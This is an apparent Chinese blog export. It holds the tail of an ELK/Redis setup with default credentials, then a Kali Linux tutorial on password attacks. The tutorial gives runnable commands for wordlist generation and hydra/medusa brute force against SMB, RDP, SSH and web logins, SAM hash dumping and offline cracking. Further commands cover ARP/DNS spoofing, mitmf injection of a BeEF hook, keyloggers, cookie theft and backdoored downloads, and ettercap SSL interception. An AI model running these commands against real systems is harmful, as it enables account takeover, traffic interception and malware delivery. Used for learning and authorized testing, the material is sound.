changeme &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 验证安装 访问http://192.168.199.103:5601 默认用户名：elastic 默认密码：changeme 导入日志文件 创建logstash_file.conf 123456789101112131415161718192021222324cd /data/loggervim logstash_file.conf input &#123; file &#123; path =&gt; [&quot;/data/server/nginx/logs/acc.log&quot;] type =&gt; &quot;nginx_log&quot; start_position =&gt; &quot;beginning&quot; &#125;&#125;output &#123; if [type] == &quot;nginx_log&quot; &#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.199.103:9200&quot;] index =&gt; &quot;access-%&#123;+YYYY.MM.dd&#125;&quot; user =&gt; elastic password =&gt; changeme &#125; &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 启动ES，logstash，kibana，调整时间，查看导入日志 ELRK 启动redis 12cd /data/server/redis/bin./redis-server 创建logstash_redis.conf 1234567891011121314151617cd /data/loggervim logstash_redis.confinput &#123; file &#123; path =&gt; &quot;/data/server/nginx/logs/acc.log&quot; type =&gt; &quot;nginx_log&quot; &#125;&#125;output &#123; redis &#123; host =&gt; &quot;192.168.199.103&quot; port =&gt; &quot;6379&quot; data_type =&gt; &quot;list&quot; key =&gt; &quot;nginx:redis&quot; &#125;&#125; 创建logstash_redis1.conf 1234567891011121314151617181920212223cd /data/loggervim logstash_redis1.confinput &#123; redis &#123; host =&gt; &quot;192.168.199.103&quot; port =&gt; &quot;6379&quot; data_type =&gt; &quot;list&quot; type =&gt; &quot;redis_input&quot; key =&gt; &quot;nginx:redis&quot; &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.199.103:9200&quot;] index =&gt; &quot;nginxlog-%&#123;+YYYY.MM.dd&#125;&quot; user =&gt; elastic password =&gt; changeme &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 启动ES，两个logstash，kibana，调整时间，查看导入日志]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux渗透测试之密码破解]]></title>
    <url>%2F2018%2F09%2F15%2FKali-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[思路当目标系统实施了强安全措施 安装了所有补丁 无任何已知漏洞 无应用层漏洞 攻击面已经最小化 此时可以使用其他方法 社会工程学，攻击人的弱点 获取目标系统用户身份 非授权的用户无法访问授信资源，已认证用户可以访问授信资源 已有用户账号权限受限，需要提权 不会触发系统报警 身份认证方法证明你是你声称你是的那个人 你知道什么 账号密码，PIN码， passphrase：密码文 你有什么 令牌，token，key，证书，密宝，手机 你是谁 指纹，视网膜，虹膜，掌纹，声纹，面部识别 多因素身份认证 以上多种方法结合使用 基于互联网的身份认证仍以账号密码为主要形式 密码破解方法 人工猜解 垃圾桶工程 被动信息收集 基于字典的暴力破解(主流) 利用键盘上可以敲击的全部字符进行组合来暴力破解(键盘空间字符爆破) 字典 保存有用户名和密码的文本文件 Kali Linux中存在的字典 12/usr/share/wordlist/usr/share/wfuzz/wordlist 字典键盘空间字符爆破 全键盘空间字符 部分键盘空间字符(基于规则) 数字，小写字母，大写字母，符号，空格，瑞典字符，高位ASCII码 crunch用于生成字典 格式：crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] min-len：字典中每行内容的最小长度 max-len：字典中每行内容的最大长度 charset string：字符集，默认为小写字符 选项： 12345-b：按大小分割字典文件为小体积的字典文件(kb/kib,mb/mib,gb/gib;不带i的以1000为划分，带i的以1024为划分)，需与-o START结合使用-c：按每个字典的行数分割字典文件为小体积的字典文件，需与-o START结合使用-o START：生成字典文件时字典文件中内容以从小到大的方式排列-o：输出-d：同一字符连续出现的次数 例： 1crunch 6 6 0123456789 -o START -d 2 -b 1mb 当前目录下会生成字典文件，字典中内容为每行6个字符，按升序排列，同一字符最多连续出现2次，每个字典文件1MB大小 字符集： crunch工具默认存在字符集列表文件，位于/usr/share/crunch/charset.lst，使用-f参数指定使用的字符集 1crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt 无重复字符 123456crunch 1 1 -p 1234567890-p：指定一串字符，crunch会对将这些字符所有的排列可能情况生成为一个字典 此参数必须是命令中的最后一个参数 最大，最小字符长度参数失效，但必须存在 与-s参数不兼容 12345crunch 4 4 0123456789 -s 9900 -s：指定字典生成的起始字符串 默认无-s参数，字典中的内容范围是0000-9999，添加-s参数后，字典中的内容范围是9900-9999 读取文件生成字典 12345crunch 1 1 -q read.txt-q：指定读取的文件 将读取的文件中的每一行当作一个基本字符，利用这些基本字符生成不同排列顺序的字典 最大，最小字符长度参数失效，但必须存在 字典生成规则 利用密码的已知规律，使用crunch生成符合规律的字典文件 12345678crunch 6 6 -t @,%%^^ -t：指定已知规律的通配符@：小写字母 lalpha,：大写字母 ualpha%：数字 numeric^：符号 symbols 输出文件压缩 123crunch 4 4 -t @,%^ -o 1.txt -z 7z-z：将生成的字典文件做压缩，支持的格式有：7z，gzip，bzip2，lzma。其中7z的压缩比率最大 例 123crunch 4 4 -f /usr/share/crunch/charset.lst hex-lower -o w.txt -t @d@@当指定-f字符集时，再指定-t中存在@时，此时的@表示字符集中的所有字符，而不是表示为小写字母 123crunch 4 5 -p dog cat bird 此时-p将后面的三个字符串视为三个基本字符，将这三个基本字符进行所有可能的排列，生成字典 123456crunch 5 5 abc DEF + \!@# -t ,@^%, +：占位符\：转义符 abc DEF + \!@#表示小写字母只使用abc，大写字母只使用DEF，数字使用+占位符，表示全部数字，特殊字符只使用!@# 12345crunch 5 5 -t ddd%% -p dog cat bird 此时命令中因指定了-p，所以ddd不表示字典前三位为ddd，只是占位符，可使用其他任意字符。指定-t参数时要符合密码的长度 此处不同于-p参数指定的值都是占位符 123crunch 5 5 -d 2@ -t @@@%% -d 2@表示同一个小写字母连续出现的次数不大于2次 与其他程序组合应用 当本地没有足够的空间存储生成的字典文件时，可将生成的字典直接交给破解程序使用 1crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w - 1crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd - cuppCommon User Password Profiler 按个人信息生成其专属的密码字典 下载安装 1git clone https://github.com/Mebus/cupp.git 使用 123python3 cupp3.py -i -i：以交互模式生成字典 cewl通过收集网站信息生成字典 支持基本，摘要身份认证 支持代理 12345678cewl IP/域名 -m 3 -d 3 -e -c -v -w a.txt-m：收集目标网站上的最小单词长度-d：爬网深度-e：收集email地址信息-c：按每个单词出现的次数生成字典-v：显示详细信息-w：输出 如图，字符串后的数字为此字符串在站点中出现的次数 用户密码变型 基于cewl的结果进行密码变型 末尾增加数字串 字母大小写变化 字母与符号互相转换 字母与数字互相转换 P@$$w0rd John the Ripper使用John the Ripper配置文件实现密码动态变型 配置文件位置：/etc/john/john.conf 修改配置文件 123456[List.Rules:Wordlist] #规则字段位置可添加$[0-9]$[0-9]$[0-9] #字典末尾添加3位数字$[0-9]$[0-9]$[0-9]$[a-zA-Z] #字典末尾添加3位数字与一位字母$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`#!#$%^&amp;*()-=_+] #字典末尾添加3位数字，3位字母，一位特殊字符 使用John the Ripper生成密码文件 12345john --wordlist=cewl.txt --rules --stdout &gt; m.txt--wordlist:基础密码文件--rules:使用john.conf配置文件中的规则，也可指定要使用的规则--stdout:标准输出 可自己添加John the Ripper工具配置文件规则 1234[List.Rules:规则名称]$[0-9]$[0-9]$[0-9] #字典末尾添加3位数字$[0-9]$[0-9]$[0-9]$[a-zA-Z] #字典末尾添加3位数字与一位字母$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`#!#$%^&amp;*()-=_+] #字典末尾添加3位数字，3位字母，一位特殊字符 指定某项规则生成密码文件 1john --wordlist=cewl.txt --rules=test --stdout &gt; m.txt 1john --wordlist=ahm.lst --rules=test HASHFILE pw-inspector按长度和字符集筛选字典 1234567pw-inspector -i /usr/share/wordlists/nma.lst -o p.lst -l -m 3 -M 5-i：指定要筛选的字典文件-o：设置筛选完成后的输出文件-l：以小写字母的条件筛选-m：指定最小长度-M：指定最大长度 在线密码破解对在运的服务器进行密码字典爆破，根据密码字典逐个尝试请求服务器。 hydra–九头蛇Windows密码破解破解Windows中admin管理共享(smb服务) 12345678910hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVd-l：指定破解使用的用户名-L：指定破解使用的用户名字典-p：指定破解使用的密码-P：指定破解使用的密码字典-v：详细模式-V：显示登陆与每次尝试-d：调试模式-R：断点续破解 破解Windows中远程桌面服务(rdp服务) 123hydra -l administrator -P pass.lst rdp://1.1.1.1 -vVd -t 1-t：hydra因速度过快(默认并发连接数为16)，会导致被破解端响应不及时而破解失败。为提高破解成功率，使用此参数指定较小并发连接数。最大并发连接数64 Linux密码破解破解Linux中ssh服务 123hydra -l root -P pass.lst ssh://1.1.1.1 -vV -e nsr -t 1-e nsr：n表示尝试空密码，s表示用户名密码相同，r表示密码为用户名倒置 其他服务密码破解支持的协议：AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码 1234hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64 -vV-s：指定非默认的服务端口-o：结果输出 hydra图形化界面–xhydrahydra基于http表单的身份认证123456789101112131415hydra -l admin -P pass.lst 1.1.1.1 http-post-from &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -Vhttp-post-from：使用http post表单身份认证username与password为表单中输入框的名称^USER^与^PASS^表示此两处为使用字典中内容填充的位置根据post请求传输数据的具体格式来定义&quot;&quot;中的构造:S=index.php：此处:后应填写当登陆失败时返回的特征字符表示此次破解尝试失败，进行下次尝试。 此处应根据服务器对登陆post包的第一次响应包中的字符来确定特征字符，而非页面显示字符(应使用bp等抓包工具来确定)。应为login.php，非页面显示的login failed DVWA中无论登陆成功或者失败，第一次响应包中都会包含login.php，所以hydra无论登陆成功与否都会认为登陆失败，进行下次尝试，所以此处应该换个思路 将失败的特征字符改为index.php，则可破解出密码。说明无论怎样，必须将特征字符准确的找出，才可能会破解成功。 1234hydra -l admin -P pass.lst 1.1.1.1 http-post-from &quot;/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo&quot; -VC：用于先访问指定的页面取得cookie，再使用此cookie进行密码破解H：指定http头，可设置多个H参数表示多个http头 hydra同时也支持http-get-form(get请求)，https-post-form请求,https-get-form请求。使用https请求时需使用-S参数，使用SSL连接 medusahydra的缺点 稳定性差，程序时常崩溃 速度控制不好，容易触发服务屏蔽或锁死机制 对每台主机新建进程，对每个服务新建实例，系统资源，存储消耗较大 大量目标时破解性能差 medusa的特点 稳定性好 速度控制得当 基于线程 支持模块少于hydra(不支持rdp) web-form支持存在缺陷 Windows密码破解123456789101112131415medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F-d：查看medusa支持的模块-h：指定破解的目标-u：指定单个用户名-U：指定用户名文件-p：指定单个密码-P：指定密码文件-C：指定用户名密码文件(文件中用户名和密码在同一行，以分隔符分开)-e n/s/ns：n表示进行空密码尝试，s表示进行密码等于用户名尝试-M：指定使用的模块-F：首次破解成功即退出程序不再进行破解-n：指定非默认端口-s：使用SSL连接-T：指定并发主机数 Linux密码破解1medusa -M ssh -h 1.1.1.1 -e ns -F -u root -P pass.lst 其他服务密码破解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849cvs.mod：CVS会话的暴力模块：2.0版ftp.mod：FTP / FTPS会话的暴力模块：版本2.1http.mod：HTTP的蛮力模块：版本2.1imap.mod：用于IMAP会话的暴力模块：版本2.0mssql.mod：M $ -SQL会话的暴力模块：版本2.0mysql.mod：MySQL会话的暴力模块：版本2.0nntp.mod：NNTP会话的暴力模块：版本2.0pcanywhere.mod：PcAnywhere会话的暴力模块：版本2.0pop3.mod：用于POP3会话的暴力模块：版本2.0postgres.mod：PostgreSQL会话的暴力模块：版本2.0rdp.mod：RDP（微软终端服务器）会话的蛮力模块：版本0.1rexec.mod：REXEC会话的蛮力模块：版本2.0rlogin.mod：RLOGIN会话的暴力模块：版本2.0rsh.mod：RSH会话的暴力模块：版本2.0smbnt.mod：SMB（LM / NTLM / LMv2 / NTLMv2）会话的强力模块：版本2.1smtp-vrfy.mod：用于验证SMTP帐户的蛮力模块（VRFY / EXPN / RCPT TO）：2.1版smtp.mod：用于TLS的SMTP身份验证的蛮力模块：版本2.0snmp.mod：SNMP Community Strings的暴力模块：版本2.1ssh.mod：用于SSH v2会话的强力模块：版本2.1svn.mod：Subversion会话的蛮力模块：版本2.1telnet.mod：用于telnet会话的暴力模块：版本2.0vmauthd.mod：VMware认证守护进程的蛮力模块：版本2.0vnc.mod：用于VNC会话的暴力模块：版本2.1web-form.mod：用于Web表单的暴力模块：版本2.1wrapper.mod：通用包装模块：版本2.0 1medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F medusa基于http表单的身份认证123456medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORM-DATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-m：指定模块中的参数值，指定多个-m来指定多个参数FORM参数：设置请求的目标DENY-SIGNAL参数：破解失败时显示的特征字符。只可设置失败特征字符，不同于hydra只需找到成功与失败不同的特征字符即可FORM-DATA参数：请求的方式，输入框中的内容(username,password) 查看某个模块使用的参数1medusa -M web-form -q medusa设计思想为当进行破解，发出请求时，服务器返回200，然后从响应包中寻找特征字符来判断是否破解成功。但是DVWA不论登陆成功或者失败都会返回302，所以medusa无法进行DVWA登陆破解。 密码破解效率 密码复杂度(字典命中率) 带宽、协议、服务器性能、客户端性能 锁定阈值 单位时间最大登陆请求次数 离线密码破解身份认证 禁止明文传输密码 每次认证使用HASH算法加密密码传输 服务器端用户数据库应加盐加密保存 破解思路 嗅探获取密码HASH 利用漏洞登陆服务器并从用户数据库中获取密码HASH 识别HASH类型 长度、字符集 利用离线破解工具碰撞密码HASH 优势 离线密码破解不会触发密码锁定机制 不会产生大量登陆失败日志引起目标管理员注意 HASH类型识别工具存在无法识别及识别错误的情况 hash-identifier1hash-identifier hashid1hashid HASH值 Windows HASH获取工具 利用漏洞：pwdump、fgdump、mimikatz、wce 物理接触：samdump2 samdump2思路： 在目标主机上使用kali iso安装光盘，进入live模式 挂载目标主机物理硬盘 12fdisk -l #查看目标主机的硬盘情况mount /dev/sda2 /mnt/ #挂载硬盘分区 寻找目标主机硬盘中的SAM数据库文件 1cd /mnt/Windows/System32/config 在此目录下存在SAM文件与SYSTEM文件，SAM文件用于存放操作系统用户的HASH密码，SYSTEM文件用于存放对SAM文件加密的密钥。若SYSTEM文件中存在密钥，则开机时需要输入两次密码，第一次为验证SYSTEM文件，解锁SAM文件；第二次为验证SAM文件，登陆系统。 利用samdump2工具在SAM数据库文件中读取HASH值 1samdump2 SYSTEM SAM -o sam.hash 拿HASH值做离线密码破解 Hashcat开源多线程密码破解工具 支持80多种加密算法破解 基于CPU的计算能力破解 六种模式 0 Straight:字典破解(默认) 1 Combination:将字典中密码进行组合(1 2 -&gt; 11 22 12 21) 2 Toggle case:尝试字典中所有密码的大小写字母组合 3 Brute force:指定字符集(或全部字符集)所有组合 4 Permutayion:字典中密码的全部字符置换组合(12-&gt;21) 5 Table-lookup:程序为字典中所有密码自动生成掩码 123456hashcat -m 1000 sam.hash pass.lst-m：指定hash算法id号sam.hash：存有hash值的文件pass.lst：密码字典-a：指定使用的模式 1-b：评估计算机CPU对不同的加密算法的破解能力 12345678910hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?d?d?l=abcdefghijklmnopqrstuvwxyz?u=ABCDEFGHIJKLMNOPQRSTUVWXYZ?d=0123456789?s=!&quot;#$%&apos;()*+,-:;&lt;=&gt;?@[\]^_`&#123;|&#125;~?a=?l?u?d?s?b=0x00-0xff可以不指定密码字典，而使用特定的字符集进行破解 12345hsahcat -m 100 -a 3 sam.hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l-i：密码长度增量模式--increment-min：最小密码长度--increment-max：最大密码长度 bkhiveWindows中syskey加密工具Windows7对SAM文件进行加密：win+R–&gt;syskey–&gt;输入密码或存储到介质–&gt;完成 此时重启Windows7系统，需先输入一次密码，之后才可以输入登陆密码 此时SAM文件经过了再次加密，其中存储的HASH值已经不同于登陆密码的HASH值了，破解难度增大 加密过程： 使用bootkey利用RC4算法加密SAM数据库 bootkey加密保存于SYSTEM文件中 bkhive用于从SYSTEM文件中提取bootkey kali2.0已经抛弃bkhive 编译安装下载地址：http://http.us.debian.org/debian/pool/main/b/bkhive/ 123456tar zxvf bkhive_1.1.1.orig.tar.gzcd bkhive-1.1.1/apt purge samdump2 #samdump2高版本与bkhive不兼容apt install libssl-devmakemake install 破解流程 将SYSTEM文件中的bootkey提取出来，存于bkey 1bkhive SYSTEM bkey 配合samdump2提取未经过bootkey加密的HASH 1samdump2 SAM bkey 无法实现，因kali2.0抛弃了bkhive，且samdump2高版本无法与bkhive兼容。建议使用kali1.x版本实现 oclhashcat号称世界上最快、唯一的基于GPGPU(通用图形处理器)的密码破解软件 免费开源、支持多平台、支持分布式、支持150多种HASH算法 硬件支持 虚拟机中无法使用 支持CUDA技术的Nvidia显卡 支持OpenCL技术的AMD显卡 限制 最大支持密码长度55个字符 使用Unicode编码的最大密码长度为27个字符 123oclhashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?aoclhashcat命令格式类似于hashcat RainbowCrack(彩虹表)通常的HASH破解技术流程 指定明文密码字典，指定要破解的HASH值 将明文密码进行与要破解的HASH值相同的加密方法进行加密 将两者进行比对，若相同，即可对应出明文密码；若不同，继续加密下一个明文密码进行比对，以此类推 基于时间记忆权衡技术生成彩虹表 提前计算密码的HASH值，破解时直接进行比对HASH值来破解密码 Kali中包含的RainbowCrack(彩虹表)工具 rtgen：预计算，生成彩虹表，耗时的阶段 rtsort：对rtgen生成的彩虹表进行排序 rcrack：查找彩虹表进行密码破解 修改版rtgen支持CUDA GPU：http://www.freerainbowtables.com/en/download 彩虹表中一般包括： 密码明文 HASH值 HASH算法 字符集类型 明文密码的长度范围 彩虹表下载 http://www.freerainbowtables.com/en/table/ http://rainbowtables.shmoo.com/ rtgen生成彩虹表 支持的HASH加密算法：lanman,NTLM，MD2，MD4，MD5，SHA1，SHA256`RIPEMD160` 1234rtgen md5 loweralpha 1 5 0 10000 10000 0-bench：评估计算机CPU生成彩虹表的能力rtgen HASH算法 字符集类型 明文密码最小长度 明文密码最大长度 表索引 表中链长 表中链数 链索引 生成的彩虹表(.rt文件)存放于/usr/share/rainbowcrack目录下 rtsort彩虹表排序 1rtsort md5_loweralpha#1-5_0_1000x1000_0.rt rcrack查找彩虹表进行密码破解 123rcrack md5_loweralpha#1-5_0_1000x1000_0.rt -h HASH值rcrack md5_loweralpha#1-5_0_1000x1000_0.rt -l hash.txt John基于CPU的密码破解工具 支持众多加密算法的破解(支持某些对称加密算法的破解) 1john --list=formats 模式： wordlist：基于规则的字典破解 single crack：默认首先使用的模式，使用当前破解账号的Login/GECOS信息尝试破解密码 GECOS信息：指Linux系统在创建账号时，要求用户填写的包括名字，电话，住址，爱好在内的个人信息，这些信息存储于/etc/passwd中。对于已经存在的账号，可使用chfn命令来添加修改账户个人信息 incremental：所有或指定字符集的暴力破解 external：需要在主配置文件中使用C语言编程来说明如何破解 默认的破解模式当不指定使用何种破解模式时，John会按照single–wordlist–incremental的顺序进行破解 当不指定使用的密码字典时，John会使用主配置文件中指定的字典，$JOHN/password.lst即/usr/share/john/password.lst 破解Linux系统账号密码123unshadow /etc/passwd /etc/shadow &gt; pass.txt #合并两个文件john pass.txt #开始密码破解john --show pass.txt #查看已经破解的密码 破解成功的密码存在于当前目录下的.john/john.pot文件中 破解Windows系统账号密码123john sam.hash --wordlist=password.lst --format=nt--format：指定要破解的hash类型 查看破解结果1john sam.hash --format=nt --show 图形化界面的john–johnnyophcrack基于彩虹表的LM,NTLM密码破解软件 图形化界面 官方彩虹表下载：http://ophcrack.sourceforge.net/tables.php 密码嗅探基础知识二、三层地址MAC地址，主机到主机 IP地址，网络到网络 交换机与HUBHUB会将数据包转发到除发送端口外的所有端口。若在HUB范围内的任意台主机，将其网卡设置为混杂模式，则可进行HUB范围内的密码嗅探 交换机根据学习地址，形成地址表来转发数据包。对于广播包，交换机会进行广播，将交换机网络范围内的主机网卡设置为混杂模式可以进行嗅探；但对于单播包，是无法进行嗅探的 ARP协议用于IP地址转换为MAC地址 基于广播学习 请求、响应相对独立 基于传闻的协议 ARP协议的安全隐患 因ARP协议的请求包与响应包是相互独立的，所以即使一主机并没有发送ARP请求包，也是可以接受ARP响应包的。 ARP协议是基于传闻的协议。当一主机接收到ARP响应包，就会信任此响应包，从而更改自己的IP与MAC对应关系表 这就形成ARP欺骗 在同一局域网络中，A声称自己的MAC地址是网关IP所对应的MAC地址。向局域网中发送大量ARP响应广播包，局域网中的主机则会信任这种网关IP的MAC是A的MAC的这种对应关系，所以当局域网中的主机向网关发送数据时，都会发送到A处，A可以进行抓包，并且可以将自己设置为路由模式，相当于替代了路由器的功能，并且还形成中间人攻击，获取到局域网内主机的数据信息。 ARP欺骗手动修改数据包，伪造ARP响应包实现ARP欺骗(OmniPeek)arpspoof1234arpspoof -t 192.168.1.12 -r 192.168.1.1-t：指定被欺骗主机-r：指定网关 效果：ARP欺骗成功后，192.168.1.12认为kali是网关，192.168.1.1认为kali是192.168.1.12。此时，1.12的数据包会发向kali，网关对1.12的回包会发向kali，从而kali实现中间人攻击 中间人实现路由转发功能 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 网络嗅探 wireshark,tcpdump等工具 抓取图片，声音 123456driftnet -i eth0 -a -d tmp/ -s -i：指定抓包的网络接口-a：抓到的图片不实时显示，存储到目录中-d：指定存储目录-s：抓取声音 抓取访问链接 1234webspy -i eth0 192.168.1.12-i：指定抓包的网络接口指定要抓取数据的被欺骗主机 抓取访问80，8080，3128端口的数据包 123urlsnarf -i eth0-i：指定抓包的网络接口 抓取密码 1234dsniff -i eth0 -m-i：指定抓包的网络接口-m：对抓取到的数据包中的协议自动解码 查看dsniff支持的解码协议 1cat /usr/share/dsniff/dsniff.services DNS欺骗 结合ARP欺骗，也可以同时进行DNS欺骗 123dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts-i：指定DNS欺骗使用的网络接口-f：指定要欺骗的域名与IP对应的列表文件 因已经进行了ARP欺骗，1.12主机的所有数据包都会发向kali。命令执行后，会对数据包中访问UDP53端口的数据包进行截获。返回假的域名、IP对应关系，从而达到DNS欺骗的效果。可以实现网站登陆等信息的抓取 DNS欺骗代理 12345dnschef --fakeip=1.1.1.1 --fakedomains=www.google.com,www.yutube.com --interface 1.1.1.2 -q --fakeip：指定欺骗后指向的IP--fakedomains：指定要欺骗的域名--interface：指定用于做欺骗的主机的IP 执行命令后，dnschef会监听做欺骗主机的udp53端口，同时指定一个真正的上游DNS服务器 修改被欺骗主机的hosts文件或DNS配置，将DNS查询请求指向做欺骗主机，实现DNS欺骗 当被欺骗主机访问被欺骗的域名时，会向做欺骗的主机发出DNS查询请求，做欺骗的主机会直接返回域名的A记录，即欺骗后指向的IP地址，实现流量劫持 当被欺骗主机访问未被欺骗的域名时，做欺骗的主机接到被欺骗主机DNS请求时，会向上游指定的真正的DNS服务器发起查询请求，得到真正的IP地址，然后返回给被欺骗主机，实现正常的DNS解析。此次过程对被欺骗主机不可见 中间人攻击 注入XSS当实现了中间人攻击，客户端向服务器的发包，以及服务器向客户端的回包，都会经过中间人。 中间人对于两方的数据包，可以查看，可以修改。 即使服务器端没有XSS漏洞，当服务器向客户端的回包经过中间人时，中间人仍然可以插入XSS攻击代码，然后返回给客户端，实现XSS攻击，被称为凌空向每个HTTP请求中注入XSS攻击代码 若中间人发生在运营商线路上，很难引起用户注意 mitmf号称最好用的中间人攻击工具(kali 2.0后默认未安装) 安装安装依赖包12apt updateapt install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file 安装 1234apt install mitmfpip uninstall twistedwget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2pip install ./Twisted-15.5.0.tar.bz2 使用mitmf会启动SSLstrip，将https降级为http 结合BeEf，将BeEf的hook.js注入到数据包中 12cd /usr/share/beef-xss/./beef 12345678mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --inject --js-url http://192.168.1.10:3000/hook.js --spoof：欺骗 --arp：arp地址欺骗 -i：指定使用的网络接口 --gateway：指定网关IP --target：指定要欺骗的目标IP --inject：注入模式 --js-url：指定恶意js脚本的地址 实现键盘记录器 1mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --jskeylogger 图片反转180度 1mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --upsidedownternet 屏幕快照 1mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --screen 每隔10秒钟，会抓取一张屏幕快照，图片存放于/var/log/mitmf 抓取cookie 1mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --ferretng 浏览器及插件信息 1mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --browserprofiler 获取SMB文件共享的信息 12--smbtrap--smbauth HTTP Strict Transport Security 用于防止协议降级、cookie窃取 安全策略通过HTTP响应头Strict-Transport-Security实施 会限制user-agent、https等 使用以下模块可绕过此安全策略 1--hsts 注入后门 1--filepwn 当客户端从服务器请求下载可执行程序时，经过中间人，中间人会在可执行程序中注入后门程序后发送给客户端，客户端执行该程序后，会安装后门，或者直接向中间人反弹shell ettercap统一功能的中间人攻击工具 可转发MAC与本机相同，但IP与本机不同的数据包 支持SSHv1、SSL中间人攻击 模块划分 snifer(抓包) MITM(中间人攻击) filter(筛选) log(日志) plugin(插件) snifer负责数据包的转发 unified单个网卡情况下，独立完成三层数据包转发 始终会禁用内核的ip_forward功能 bridge两块网卡情况下，一块负责数据包进入，另一块负责数据包发出。相当于一层MITM模式 相当于IPS过滤数据包 不可在网关上使用这种模式，此模式相当于透明网桥，有较大的安全风险 MITM把流量重定向到ettercap主机上 可以使用其他工具实现MITM，ettercap只作为嗅探和过滤使用 实现MITM的方法 ARP地址欺骗 ICMP ICMP路由重定向数据包，只可实现半双工中间人攻击 半双工指客户端发包发向中间人，中间人发向服务器，但服务器的回包不经过中间人，由服务器直接发向客户端 DHCP 修改网关地址，半双工 switch port stealing(窃取交换机端口) 适用于ARP静态绑定的环境 攻击者与被攻击者连接在同一交换机上，攻击者发送flood包，目标地址是攻击者本机MAC地址，伪造源地址为被攻击者的MAC地址。此时交换机会认为攻击者所连的交换机端口的MAC地址是被攻击者的，则以后交换机收到的发往被攻击者的数据包都会发向攻击者，实现半双工的中间人攻击。若同时对被攻击者进行端口窃取，让被攻击者认为攻击者为交换机。则可实现全双工的中间人攻击 NDP IPv6协议欺骗技术 Linux2.4 以上内核对ARP地址欺骗的约束 收到非自己发出的ARP请求包的响应包时，不更新本地ARP缓存 ettercap使用ARP request包进行攻击 solaris系统不根据ARP包来更新本地ARP缓存 ettercap首先发送ICMP包来更新目标ARP缓存 基于ARP欺骗的使用用户操作界面1234-T #文本界面-G #图形界面-C #基于文本的图形界面-D #后台模式 指定目标1234格式：MAC地址/IPv4地址(s)/IPv6地址(s)/端口号(s) MAC地址/IPv4地址(s)/IPv6地址(s)/端口号(s)表示在这两个IP之间进行中间人攻击若无，则空。保证///格式正确 权限修改配置文件 123456vim /etc/ettercap/etter.confec_uid = 0ec_gid = 0以root权限运行ettercap 基于伪造证书的SSL MITMbridge模式不支持SSL MITM 生成证书 12345openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new &gt;&gt; etter.ssl.crtrm -rf tmp.newtmp.csr 字符模式123456789101112ettercap -i eth0 -T -M arp:remote -q /1.1.1.1// /1.1.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message-i：指定网络接口-T：字符模式-M：指定使用的中间人技术(arp 全双工)-q：安静模式-F：调用过滤器-P：调用模块-w：存储网络流量信息于文件中-l：存储简单的日志信息于文件中-L：存储所有的日志信息于文件中-m：存储消息信息于文件中 图形界面SSL MITM开启SSL功能 123vim /etc/ettercap/etter.confLinux iptables选项启用 DNS欺骗修改dns_spoof插件配置文件 12345vim /etc/ettercap/etter.dns添加要欺骗的域名和IP对应关系ettercap -Tq -M arp:remote -i eth0 /192.168.1.1// /192.168.1.114// -P dns_spoof 查看日志1234etterlog -p logall.eci #查看获取的密码(eci文件)etterlog -c log.ecp 